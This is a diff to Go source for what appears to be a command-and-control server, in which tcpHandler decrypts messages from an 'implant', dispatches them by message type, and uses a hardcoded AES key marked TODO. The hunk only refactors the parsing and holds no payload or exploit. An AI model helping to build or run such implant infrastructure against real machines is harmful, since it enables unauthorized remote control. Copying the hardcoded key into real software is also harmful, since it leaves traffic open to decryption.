@@ -21,26 +21,26 @@ var messageTypeToFunc = map[int]func(net.Conn, interface{}){
 
 // This function can be passed to a listener to handle incoming connections.
 func tcpHandler(conn net.Conn) {
-	envelope, err := communication.ReceiveEnvelope(conn, []byte("thisis32bitlongpassphraseimusing")) //TODO: change aes key to a proper one :)
+	messageType, data, err := communication.ReceiveEnvelope(conn, []byte("thisis32bitlongpassphraseimusing")) //TODO: change aes key to a proper one :)
 	if err != nil {
 		log.Printf("[ERROR] Could not understand message sent by implant. Reason: %s", err.Error())
 	}
 
-	handlerFunc := messageTypeToFunc[envelope.MessageType]
-	reflectionHelper := communication.MessageTypeToStruct[envelope.MessageType] //this variable contains a pointer to a function that will return the datastructure belonging to messageType
+	handlerFunc := messageTypeToFunc[messageType]
+	reflectionHelper := communication.MessageTypeToStruct[messageType] //this variable contains a pointer to a function that will return the datastructure belonging to messageType
 	if handlerFunc == nil || reflectionHelper == nil {
 		log.Printf("[WARN] Envelope with invalid messageType was sent. Aborting connection with: %s", conn.RemoteAddr().String())
 		conn.Close()
 		return
 	}
-	data := reflectionHelper() //call the reflectionHelper function that will return the datatype corresponding to our messagetype
-	err = json.Unmarshal(envelope.Data, data)
+	dataAsStruct := reflectionHelper() //call the reflectionHelper function that will return the datatype corresponding to our messagetype
+	err = json.Unmarshal(data, dataAsStruct)
 	if err != nil {
 		log.Printf("[ERROR] Could not unmarshal decrypted data. Aborting connection with: %s", conn.RemoteAddr().String())
 		conn.Close()
 		return
 	}
-	handlerFunc(conn, data)
+	handlerFunc(conn, dataAsStruct)
 }
 
 //-------------------Begin message handlers--------------------
